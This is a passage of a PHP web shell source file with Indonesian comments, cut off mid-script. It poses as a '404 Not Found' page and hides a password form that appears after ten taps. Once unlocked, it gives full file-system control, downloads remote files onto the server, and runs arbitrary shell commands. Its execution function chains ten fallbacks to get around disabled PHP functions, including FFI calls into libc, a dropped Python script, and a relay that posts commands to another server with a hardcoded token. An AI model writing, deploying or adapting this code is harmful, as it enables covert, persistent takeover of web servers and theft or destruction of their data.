<?php
session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$self = basename(__FILE__);
$lock_file = __DIR__ . '/.fs_lock';
$cwd = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$cwd = $cwd ?: getcwd();
$msg = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';

$clipboard_items = isset($_SESSION['clipboard_items']) ? $_SESSION['clipboard_items'] : [];
$clipboard_type = isset($_SESSION['clipboard_type']) ? $_SESSION['clipboard_type'] : null;

if (file_exists($lock_file) && !isset($_SESSION['unlocked'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
        $hash = file_get_contents($lock_file);
        if (password_verify($_POST['pass'], $hash)) {
            $_SESSION['unlocked'] = true;
            header("Location: ?d=" . urlencode($cwd));
            exit;
        } else {
            $msg = "Password salah";
        }
    }
echo <<<HTML
<!DOCTYPE html>
<html style="height:100%" data-bs-theme="dark">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title>404 Not Found</title>
<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
<style>
  body { color:#444; margin:0; font:normal 14px/20px Arial,Helvetica,sans-serif; height:100%; background-color:var(--bs-body-bg); }
  .hidden-message { display:none; font-size:24px; color:green; }
</style>
</head>
<body ontouchstart="">
<div style="height:auto;min-height:100%;">
  <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;color:var(--bs-body-color);">
    <h1 style="margin:0;font-size:150px;line-height:150px;font-weight:bold;">404</h1>
    <h2 style="margin-top:20px;font-size:30px;">Not Found</h2>
    <p>The resource requested could not be found on this server!</p>
  </div>
</div>
<div class="hidden-message" id="secret">
  <form method='post' class="d-flex flex-column align-items-center mt-5">
    <input type='password' name='pass' placeholder='Password' class="form-control mb-2" style="max-width:300px;">
    <button type="submit" class="btn btn-success">Akses</button>
  </form>
</div>
<script>
  let tapCount=0,timer;
  ['click','touchstart'].forEach(eventType=>{
    document.body.addEventListener(eventType,function(){
      tapCount++;clearTimeout(timer);
      if(tapCount>=10){document.getElementById('secret').style.display='block';}
      timer=setTimeout(()=>{tapCount=0;},800);
    });
  });
</script>
HTML;
    if (!empty($msg)) { echo "<script>alert('$msg');</script>"; }
    exit;
}

// ── Helper Functions ────────────────────────────────────────────────────────

function list_dir($path) {
    $items = scandir($path);
    $dirs = $files = [];
    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        $full = "$path/$item";
        if (!file_exists($full)) continue;
        $info = [
            'name'   => $item,
            'path'   => $full,
            'is_dir' => is_dir($full),
            'size'   => is_file($full) ? filesize($full) : '-',
            'mtime'  => filemtime($full)
        ];
        if (is_dir($full)) $dirs[] = $info;
        else $files[] = $info;
    }
    $current_path_real   = realpath($path);
    $document_root_real  = realpath($_SERVER['DOCUMENT_ROOT']);
    if ($current_path_real !== '/' && $current_path_real !== $document_root_real) {
        $parent_path = dirname($path);
        if (strpos(realpath($parent_path), $document_root_real) === 0 || $parent_path === '/') {
            array_unshift($dirs, [
                'name'   => '..',
                'path'   => $parent_path,
                'is_dir' => true,
                'size'   => '-',
                'mtime'  => filemtime($parent_path)
            ]);
        }
    }
    return array_merge($dirs, $files);
}

function formatSize($b) {
    if (!is_numeric($b)) return '-';
    if ($b >= 1073741824) return round($b/1073741824,2).' GB';
    if ($b >= 1048576)    return round($b/1048576,2).' MB';
    if ($b >= 1024)       return round($b/1024,2).' KB';
    return $b.' B';
}

function perms($file) {
    $p = @fileperms($file);
    if ($p === false) return '---------';
    return ($p&0x4000?'d':'-').
           (($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-').(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-')).
           (($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-').(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-')).
           (($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-').(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
}

function perms_to_octal($perms) {
    return substr(sprintf('%o', $perms), -4);
}

function breadcrumbs($path, $self_filename) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $full  = '';
    $out   = ['<a href="'.htmlspecialchars($self_filename).'">/</a>'];
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $full .= '/'.$part;
        $out[] = "<a href='?d=".urlencode($full)."'>$part</a>";
    }
    return implode("/", $out);
}

function delete_recursive($path) {
    if (!file_exists($path)) return false;
    if (is_file($path)) return unlink($path);
    elseif (is_dir($path)) {
        $items = array_diff(scandir($path), ['.','..']);
        foreach ($items as $item) {
            if (!delete_recursive($path.DIRECTORY_SEPARATOR.$item)) return false;
        }
        return rmdir($path);
    }
    return false;
}

function create_zip_from_items($items_to_zip, $destination_zip_file, $base_dir) {
    if (!extension_loaded('zip')) return false;
    $zip = new ZipArchive();
    if (!$zip->open($destination_zip_file, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE)) return false;
    $success_count = 0;
    foreach ($items_to_zip as $item_path_encoded) {
        $item_path = realpath(urldecode($item_path_encoded));
        if ($item_path === false || !file_exists($item_path)) continue;
        if (strpos($item_path, realpath($base_dir)) !== 0) continue;
        $relativePath = ltrim(str_replace(realpath($base_dir), '', $item_path), DIRECTORY_SEPARATOR);
        if (realpath($base_dir) === $item_path) $relativePath = basename($item_path);
        elseif (str_starts_with($item_path, realpath($base_dir).DIRECTORY_SEPARATOR))
            $relativePath = substr($item_path, strlen(realpath($base_dir))+1);
        if (is_file($item_path)) {
            if ($zip->addFile($item_path, $relativePath)) $success_count++;
        } elseif (is_dir($item_path)) {
            $zip->addEmptyDir($relativePath.'/');
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath  = $file->getRealPath();
                    $entryName = $relativePath.'/'.ltrim(str_replace($item_path,'',$filePath),DIRECTORY_SEPARATOR);
                    if ($zip->addFile($filePath, $entryName)) $success_count++;
                }
            }
        }
    }
    $zip->close();
    return $success_count;
}

function copy_recursive($source, $dest) {
    if (is_file($source)) return copy($source, $dest);
    elseif (is_dir($source)) {
        @mkdir($dest, 0755, true);
        $items = array_diff(@scandir($source) ?: [], ['.','..']);
        foreach ($items as $item) {
            if (!copy_recursive($source.DIRECTORY_SEPARATOR.$item, $dest.DIRECTORY_SEPARATOR.$item)) return false;
        }
        return true;
    }
    return false;
}

function getUrlContent($url) {
    if (!extension_loaded('curl')) return false;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0',
        CURLOPT_TIMEOUT        => 30,
    ]);
    $data = curl_exec($ch);
    if (curl_errno($ch)) $data = false;
    curl_close($ch);
    return $data;
}

// ── Command Output Formatter ────────────────────────────────────────────────

function _cmd_fmt($out, $err = '', $code = '') {
    $body = htmlspecialchars($out);
    if ($err !== '')  $body .= "\n<span style='color:#ff8c00'>STDERR:\n".htmlspecialchars($err)."</span>";
    if ($code !== '') $body .= "\n<span style='color:#888'>Exit: $code</span>";
    return "<pre style='color:#00ff00;background:#111;padding:1em;border-radius:4px;overflow:auto'>$body</pre>";
}

function _cmd_available() {
    static $cache = null;
    if ($cache !== null) return $cache;
    $candidates = ['proc_open','shell_exec','exec','system','passthru','popen'];
    foreach ($candidates as $fn) {
        if (function_exists($fn)) { $cache = $fn; return $fn; }
    }
    if (in_array('expect', stream_get_wrappers(), true)) { $cache = 'expect'; return 'expect'; }
    if (extension_loaded('ffi')) { $cache = 'ffi'; return 'ffi'; }
    $cache = false;
    return false;
}

// ── EXECUTE COMMAND (FIXED — getmypid() diganti uniqid()) ──────────────────

function execute_command($cmd, $cwd) {
    $full = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";

    // 1. proc_open
    if (function_exists('proc_open')) {
        $spec = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $proc = @proc_open($cmd, $spec, $pipes, $cwd, null);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]); fclose($pipes[1]);
            $err = stream_get_contents($pipes[2]); fclose($pipes[2]);
            $ret = proc_close($proc);
            return _cmd_fmt($out, $err, $ret);
        }
    }

    // 2. shell_exec
    if (function_exists('shell_exec')) {
        $out = @shell_exec($full);
        if ($out !== null) return _cmd_fmt($out);
    }

    // 3. exec
    if (function_exists('exec')) {
        $lines = []; $ret = -1;
        @exec($full, $lines, $ret);
        return _cmd_fmt(implode("\n", $lines), '', $ret);
    }

    // 4. system
    if (function_exists('system')) {
        ob_start(); @system($full, $ret);
        return _cmd_fmt(ob_get_clean(), '', $ret);
    }

    // 5. passthru
    if (function_exists('passthru')) {
        ob_start(); @passthru($full);
        return _cmd_fmt(ob_get_clean());
    }

    // 6. popen
    if (function_exists('popen')) {
        $h = @popen($full, 'r');
        if ($h) {
            $out = '';
            while (!feof($h)) $out .= fread($h, 8192);
            pclose($h);
            return _cmd_fmt($out);
        }
    }

    // 7. expect://
    if (in_array('expect', stream_get_wrappers(), true)) {
        $h = @fopen("expect://$full", 'r');
        if ($h) {
            $out = '';
            while (!feof($h)) $out .= fread($h, 8192);
            fclose($h);
            return _cmd_fmt($out);
        }
    }

    // 8. FFI -> libc popen
    if (extension_loaded('ffi')) {
        try {
            $libc = @FFI::cdef(
                "typedef void FILE;\n".
                "FILE *popen(const char *cmd, const char *type);\n".
                "char *fgets(char *s, int n, FILE *fp);\n".
                "int   pclose(FILE *fp);\n",
                "libc.so.6"
            );
            if ($libc) {
                $fp  = $libc->popen("$full", "r");
                $out = '';
                if ($fp) {
                    $buf = str_repeat("\0", 4096);
                    while ($libc->fgets($buf, 4096, $fp) !== null) {
                        $chunk = FFI::string($buf);
                        if ($chunk === '') break;
                        $out .= $chunk;
                        $buf  = str_repeat("\0", 4096);
                    }
                    $libc->pclose($fp);
                    return _cmd_fmt($out);
                }
            }
        } catch (\Throwable $e) {}
    }

    // 9. Python via file_put_contents — FIX: pakai uniqid() bukan getmypid()
    if (function_exists('file_put_contents') && function_exists('file_get_contents')) {
        $uid     = uniqid('cmd_', true);
        $tmp_py  = sys_get_temp_dir() . '/._' . $uid . '.py';
        $tmp_out = sys_get_temp_dir() . '/._' . $uid . '.txt';

        $py_code = "import subprocess, os\n".
                   "r = subprocess.run(".json_encode($cmd).", shell=True, cwd=".
                   json_encode($cwd).", capture_output=True, text=True)\n".
                   "open(".json_encode($tmp_out).", 'w').write(r.stdout + r.stderr)\n";

        file_put_contents($tmp_py, $py_code);

        foreach (['/usr/bin/python3','/usr/bin/python','python3','python'] as $py_bin) {
            $py_cmd = "$py_bin $tmp_py";
            if (function_exists('exec'))        { @exec($py_cmd); }
            elseif (function_exists('system'))  { @system($py_cmd); }
            elseif (function_exists('shell_exec')) { @shell_exec($py_cmd); }

            if (file_exists($tmp_out)) {
                $out = file_get_contents($tmp_out);
                @unlink($tmp_py); @unlink($tmp_out);
                if (!empty(trim($out))) return _cmd_fmt($out);
            }
        }
        @unlink($tmp_py); @unlink($tmp_out);
    }

    // 10. CURL RELAY — isi $relay_url dengan URL relay.php di server lain
    $relay_url   = '';           // contoh: 'https://yourserver.com/relay.php'
    $relay_token = 'Masuk123x'; // token — harus sama persis dengan relay.php

    if (!empty($relay_url) && function_exists('curl_init')) {
        // Kirim sebagai URL-encoded string (bukan array) agar tidak ada encoding issue
        $post_body = http_build_query(['token' => $relay_token, 'cmd' => $cmd, 'cwd' => $cwd]);

        // Metode A: POST dengan body URL-encoded
        $ch = curl_init($relay_url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $post_body,
            CURLOPT_HTTPHEADER     => [
                'Content-Type: application/x-www-form-urlencoded',
                'X-Relay-Token: ' . $relay_token,
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
        ]);
        $out  = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($out !== false && $code === 200 && !empty(trim($out))) return _cmd_fmt($out);

        // Metode B: GET (fallback jika POST diblokir server relay)
        $get_url = $relay_url . '?' . http_build_query(['token' => $relay_token, 'cmd' => $cmd, 'cwd' => $cwd]);
        $ch = curl_init($get_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
        ]);
        $out  = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($out !== false && $code === 200 && !empty(trim($out))) return _cmd_fmt($out);
    }

    // 11. Semua metode gagal
    return "<div class='alert alert-danger mt-2'>
        <strong>⚠ Semua metode eksekusi diblokir oleh server.</strong><br>
        Dicoba: <code>proc_open, shell_exec, exec, system, passthru, popen, expect://, FFI, python, curl-relay</code><br>
        <strong>Solusi:</strong> Upload <code>relay.php</code> ke server lain yang exec-nya tidak diblokir,
        lalu isi variabel <code>\$relay_url</code> di file ini dengan URL relay tersebut.
    </div>";
}

// ── Action Handlers (POST) ─────────────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_POST['uploadfile'])) {
        if (!is_writable($cwd)) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Upload gagal: Direktori tidak dapat ditulis.")); exit;
        }
        if (isset($_FILES['uploadfile']) && $_FILES['uploadfile']['error'] === UPLOAD_ERR_OK) {
            $dest = $cwd.'/'.basename($_FILES['uploadfile']['name']);
            $ok   = move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
            header("Location: ?d=".urlencode($cwd)."&msg=".($ok ? urlencode("Upload sukses") : urlencode("Upload gagal.")));
        } else {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Upload gagal: Error ".$_FILES['uploadfile']['error']));
        }
        exit;
    }

    if (isset($_POST['newfile'])) {
        if (!is_writable($cwd)) { header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Direktori tidak dapat ditulis.")); exit; }
        $filename = trim($_POST['newfile']);
        if (empty($filename) || strpos($filename,'/')!==false || strpos($filename,'\\')!==false) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Nama file tidak valid.")); exit;
        }
        $ok = file_put_contents($cwd.'/'.$filename, $_POST['filedata']);
        header("Location: ?d=".urlencode($cwd)."&msg=".($ok!==false ? urlencode("File dibuat") : urlencode("Gagal membuat file")));
        exit;
    }

    if (isset($_POST['newfolder'])) {
        if (!is_writable($cwd)) { header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Direktori tidak dapat ditulis.")); exit; }
        $foldername = trim($_POST['newfolder']);
        if (empty($foldername) || strpos($foldername,'/')!==false || strpos($foldername,'\\')!==false) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Nama folder tidak valid.")); exit;
        }
        $ok = mkdir($cwd.'/'.$foldername);
        header("Location: ?d=".urlencode($cwd)."&msg=".($ok ? urlencode("Folder dibuat") : urlencode("Gagal membuat folder")));
        exit;
    }

    if (isset($_POST['setpass'])) {
        file_put_contents($lock_file, password_hash($_POST['setpass'], PASSWORD_DEFAULT));
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Password disimpan")); exit;
    }

    if (isset($_POST['editfile'])) {
        $filepath = urldecode($_POST['filepath']);
        if (realpath($filepath)===false || strpos(realpath($filepath),realpath($cwd))!==0 || is_dir($filepath)) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal menyimpan: Path tidak valid.")); exit;
        }
        if (!is_writable($filepath)) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal menyimpan: File tidak dapat ditulis.")); exit;
        }
        $ok = file_put_contents($filepath, $_POST['filedata']);
        header("Location: ?d=".urlencode($cwd)."&msg=".($ok!==false ? urlencode("File berhasil disimpan") : urlencode("Gagal menyimpan file")));
        exit;
    }

    if (isset($_POST['rename_submit'])) {
        $old      = urldecode($_POST['old_path_rename']);
        $new_name = basename(trim($_POST['new_name']));
        $new      = dirname($old).'/'.$new_name;
        $old_real = realpath($old);
        $cwd_real = realpath($cwd);
        if ($old_real===false || strpos($old_real,$cwd_real)!==0) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal rename: Path tidak valid.")); exit;
        }
        if (empty($new_name)) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal rename: Nama baru kosong.")); exit;
        }
        $ok = rename($old, $new);
        header("Location: ?d=".urlencode($cwd)."&msg=".($ok ? urlencode("Rename sukses") : urlencode("Rename gagal")));
        exit;
    }

    if (isset($_POST['delpass'])) {
        if (file_exists($lock_file)) {
            if (unlink($lock_file)) { $_SESSION['unlocked']=false; header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Password dihapus")); }
            else { header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal menghapus password.")); }
        } else { header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("File password tidak ditemukan.")); }
        exit;
    }

    if (isset($_POST['batch_action']) && isset($_POST['selected_items']) && !empty($_POST['selected_items'])) {
        $selected_items = $_POST['selected_items'];
        $action_type    = $_POST['batch_action'];
        $msg_text       = '';
        $success_count  = 0;
        $failed_items   = [];

        foreach ($selected_items as $key => $item_encoded) {
            $item_path = realpath(urldecode($item_encoded));
            if ($item_path===false || strpos($item_path,realpath($cwd))!==0) {
                $failed_items[] = basename(urldecode($item_encoded))." (path invalid)";
                unset($selected_items[$key]);
            } else {
                $selected_items[$key] = $item_path;
            }
        }

        switch ($action_type) {
            case 'delete':
                foreach ($selected_items as $item_path) {
                    if (delete_recursive($item_path)) $success_count++;
                    else $failed_items[] = basename($item_path);
                }
                $msg_text = "$success_count item berhasil dihapus.";
                if (!empty($failed_items)) $msg_text .= " Gagal: ".implode(", ",$failed_items).".";
                break;
            case 'zip':
                if (!is_writable($cwd)) { $msg_text="Gagal membuat zip: direktori tidak bisa ditulis."; break; }
                $zip_file = $cwd.'/archive_'.time().'.zip';
                $cnt = create_zip_from_items($selected_items, $zip_file, $cwd);
                if ($cnt!==false && $cnt>0) $msg_text="Berhasil mengarsipkan $cnt item ke ".basename($zip_file);
                else { $msg_text="Gagal membuat zip."; if (file_exists($zip_file)) unlink($zip_file); }
                break;
            case 'copy':
            case 'cut':
                $_SESSION['clipboard_items'] = [];
                $_SESSION['clipboard_type']  = $action_type;
                foreach ($selected_items as $item_path) { $_SESSION['clipboard_items'][]=$item_path; $success_count++; }
                $verb = ($action_type==='copy'?'disalin':'dipotong');
                $msg_text="$success_count item berhasil {$verb} ke clipboard.";
                if (!empty($failed_items)) $msg_text.=" Gagal: ".implode(", ",$failed_items).".";
                break;
            default:
                $msg_text="Aksi batch tidak valid.";
        }
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode($msg_text)); exit;
    }

    if (isset($_POST['set_chmod'])) {
        $target_path  = urldecode($_POST['chmod_path']);
        $octal_value  = $_POST['chmod_octal'];
        if (!preg_match('/^[0-7]{3,4}$/', $octal_value)) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal CHMOD: Format tidak valid.")); exit;
        }
        $mode        = octdec($octal_value);
        $target_real = realpath($target_path);
        $cwd_real    = realpath($cwd);
        if ($target_real===false || strpos($target_real,$cwd_real)!==0) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal CHMOD: Path tidak valid.")); exit;
        }
        $ok = @chmod($target_path, $mode);
        if ($ok) header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("CHMOD berhasil: $octal_value"));
        else     header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal CHMOD: Izin tidak cukup."));
        exit;
    }

    if (isset($_POST['paste_item'])) {
        if (empty($_SESSION['clipboard_items'])||!isset($_SESSION['clipboard_type'])) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Clipboard kosong.")); exit;
        }
        if (!is_writable($cwd)) {
            header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Direktori tujuan tidak dapat ditulis.")); exit;
        }
        $operation_type = $_SESSION['clipboard_type'];
        $total_success  = 0;
        $total_failed   = [];

        foreach ($_SESSION['clipboard_items'] as $source_path) {
            $destination_path = $cwd.DIRECTORY_SEPARATOR.basename($source_path);
            $source_real      = realpath($source_path);
            if ($source_real===false||!file_exists($source_real)) { $total_failed[]=basename($source_path)." (sumber tidak ditemukan)"; continue; }
            if ($source_real===realpath($destination_path))       { $total_failed[]=basename($source_path)." (lokasi sama)"; continue; }
            if (is_dir($source_real)&&strpos($destination_path,$source_real.DIRECTORY_SEPARATOR)===0) { $total_failed[]=basename($source_path)." (tempel ke dalam diri sendiri)"; continue; }

            $ok = false;
            if ($operation_type==='copy') $ok=copy_recursive($source_real,$destination_path);
            elseif ($operation_type==='cut') $ok=rename($source_real,$destination_path);

            if ($ok) $total_success++;
            else $total_failed[]=basename($source_path);
        }

        if ($total_success>0) {
            unset($_SESSION['clipboard_items'],$_SESSION['clipboard_type']);
            $msg_action=($operation_type==='copy'?'menyalin':'memindahkan');
            $msg_text="Berhasil {$msg_action} $total_success item.";
            if (!empty($total_failed)) $msg_text.=" Gagal: ".implode(", ",$total_failed).".";
        } else {
            $msg_text="Gagal menempel item.";
            if (!empty($total_failed)) $msg_text.=" Gagal: ".implode(", ",$total_failed).".";
        }
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode($msg_text)); exit;
    }

    if (isset($_POST['cmd_exec']) && isset($_POST['command'])) {
        $command_to_exec = trim($_POST['command']);
        $cmd_output      = execute_command($command_to_exec, $cwd);
        if (!isset($_SESSION['cmd_history'])) $_SESSION['cmd_history']=[];
        array_unshift($_SESSION['cmd_history'], $command_to_exec);
        $_SESSION['cmd_history'] = array_slice($_SESSION['cmd_history'],0,10);
        header("Location: ?action=cmd&d=".urlencode($cwd)."&cmd_output=".urlencode($cmd_output));
        exit;
    }

    if (isset($_POST['clear_cmd_history'])) {
        unset($_SESSION['cmd_history']);
        header("Location: ?action=cmd&d=".urlencode($cwd)."&msg=".urlencode("Riwayat dihapus.")); exit;
    }

    if (isset($_POST['download_url_and_save'])) {
        $url      = trim($_POST['url_to_download_raw']);
        $filename = trim($_POST['filename_to_save']);
        $message  = '';
        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($filename)) {
            $filename_safe        = basename($filename);
            $destination_filepath = $cwd.DIRECTORY_SEPARATOR.$filename_safe;
            if ($filename_safe===basename(__FILE__)||$filename_safe==='.fs_lock') {
                $message="<span style='color:red;'>❌ Nama file ini tidak diizinkan!</span>";
            } elseif (!is_writable($cwd)) {
                $message="<span style='color:red;'>❌ Direktori tidak dapat ditulis!</span>";
            } else {
                $data = getUrlContent($url);
                if ($data!==false&&strlen($data)>0) {
                    if (file_put_contents($destination_filepath,$data)!==false)
                        $message="<span style='color:green;'>✅ Berhasil menyimpan sebagai <strong>".htmlspecialchars($filename_safe)."</strong></span>";
                    else $message="<span style='color:red;'>❌ Gagal menulis file!</span>";
                } else {
                    $message="<span style='color:red;'>❌ Gagal mengambil data dari URL!</span>";
                }
            }
        } else {
            $message="<span style='color:red;'>⚠️ URL tidak valid atau nama file kosong!</span>";
        }
        header("Location: ?action=cmd&d=".urlencode($cwd)."&msg=".urlencode($message)); exit;
    }
}

// ── GET Actions ─────────────────────────────────────────────────────────────

if (isset($_GET['delete'])) {
    $target = realpath(urldecode($_GET['delete']));
    if ($target!==false&&strpos($target,realpath($cwd))===0) {
        $ok=delete_recursive($target);
        header("Location: ?d=".urlencode($cwd)."&msg=".($ok?urlencode("Dihapus"):urlencode("Gagal hapus")));
    } else {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal hapus: Path tidak valid."));
    }
    exit;
}

if (isset($_GET['unzip'])) {
    $file_to_unzip = realpath(urldecode($_GET['unzip']));
    if ($file_to_unzip===false||!file_exists($file_to_unzip)||is_dir($file_to_unzip)) {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal unzip: File tidak ditemukan.")); exit;
    }
    if (strpos($file_to_unzip,realpath($cwd))!==0) {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("File di luar direktori kerja.")); exit;
    }
    $extract_path = dirname($file_to_unzip);
    if (!is_writable($extract_path)) {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Direktori tujuan tidak dapat ditulis.")); exit;
    }
    $zip = new ZipArchive;
    if ($zip->open($file_to_unzip)===TRUE) {
        $ok=$zip->extractTo($extract_path); $zip->close();
        header("Location: ?d=".urlencode($cwd)."&msg=".($ok?urlencode("File berhasil di-unzip."):urlencode("Gagal unzip.")));
    } else {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal membuka file zip."));
    }
    exit;
}

if (isset($_GET['edit'])) {
    $f = realpath(urldecode($_GET['edit']));
    if ($f===false||!file_exists($f)||is_dir($f)||strpos($f,realpath($cwd))!==0||!is_readable($f)) {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("File tidak dapat diedit.")); exit;
    }
    $data = htmlspecialchars(file_get_contents($f));
    echo "<!DOCTYPE html>
    <html data-bs-theme='dark'><head>
    <meta name='viewport' content='width=device-width,initial-scale=1,shrink-to-fit=no'/>
    <title>Edit File</title>
    <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
    </head><body class='p-4'>
    <a href='?d=".urlencode($cwd)."' class='btn btn-sm btn-secondary mb-3'>← Kembali</a>
    <form method='post'>
        <h3>Edit: ".basename($f)."</h3>
        <textarea name='filedata' class='form-control mb-2' style='width:100%;height:400px;'>".$data."</textarea>
        <input type='hidden' name='filepath' value='".htmlspecialchars($f)."'>
        <button name='editfile' class='btn btn-success mt-2'>Simpan</button>
    </form></body></html>";
    exit;
}

if (isset($_GET['download'])) {
    $file_to_download = realpath(urldecode($_GET['download']));
    if ($file_to_download===false||!file_exists($file_to_download)||is_dir($file_to_download)||strpos($file_to_download,realpath($cwd))!==0||!is_readable($file_to_download)) {
        header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal download: File tidak ditemukan.")); exit;
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
    header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public');
    header('Content-Length: '.filesize($file_to_download));
    readfile($file_to_download); exit;
}
?>
<!DOCTYPE html>
<html data-bs-theme="dark">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title>File Manager</title>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js'></script>
<style>
body{padding-top:70px;}
.navbar{position:fixed;top:0;left:0;right:0;z-index:1030;}
a{text-decoration:none;}
.clipboard-cut{background-color:#ffc10740;}
.clipboard-copy{background-color:#17a2b840;}
#batchActionsContainer{display:none;}
.table-responsive-custom{overflow-x:auto;width:100%;}
.table{min-width:700px;}
.navbar-nav .nav-item .btn{
    background-color:rgba(108,117,125,0.7);border-color:rgba(108,117,125,0.9);
    color:#fff;padding:.5rem .75rem;display:flex;align-items:center;
    justify-content:center;border:1px solid rgba(255,255,255,0.3);border-radius:.3rem;
}
.navbar-nav .nav-item .btn:hover{background-color:rgba(108,117,125,0.9);}
.navbar-nav .nav-item{margin-right:5px;}
.navbar-nav .nav-item .btn i{margin-right:5px;}
.table tbody tr.active-row{background-color:var(--bs-table-active-bg);}
</style>
<script>
function toggleTheme(){
    const html=document.documentElement;
    const theme=html.dataset.bsTheme==='dark'?'light':'dark';
    html.setAttribute('data-bs-theme',theme);
    document.cookie='theme='+theme+'; path=/; max-age=31536000';
}
window.onload=()=>{
    const html=document.documentElement;
    const m=document.cookie.match(/theme=(dark|light)/);
    html.setAttribute('data-bs-theme',m?m[1]:'dark');
    const checkboxes=document.querySelectorAll('input[name="selected_items[]"]');
    checkboxes.forEach(cb=>cb.addEventListener('change',updateBatchActionsVisibility));
    updateBatchActionsVisibility();
    const tableRows=document.querySelectorAll('.table tbody tr');
    tableRows.forEach(row=>{
        row.addEventListener('click',function(event){
            let target=event.target;
            while(target!==this&&target!==null){
                if(target.type==='checkbox'||target.tagName==='A'||target.tagName==='BUTTON') return;
                target=target.parentElement;
            }
            tableRows.forEach(r=>r.classList.remove('active-row'));
            this.classList.add('active-row');
        });
    });
};
function toggleAll(source){
    document.querySelectorAll('input[name="selected_items[]"]').forEach(cb=>cb.checked=source.checked);
    updateBatchActionsVisibility();
}
function updateBatchActionsVisibility(){
    const sel=document.querySelectorAll('input[name="selected_items[]"]:checked');
    document.getElementById('batchActionsContainer').style.display=sel.length>0?'flex':'none';
}
function confirmAction(action){
    const msgs={
        delete:'Yakin ingin menghapus item yang dipilih?',
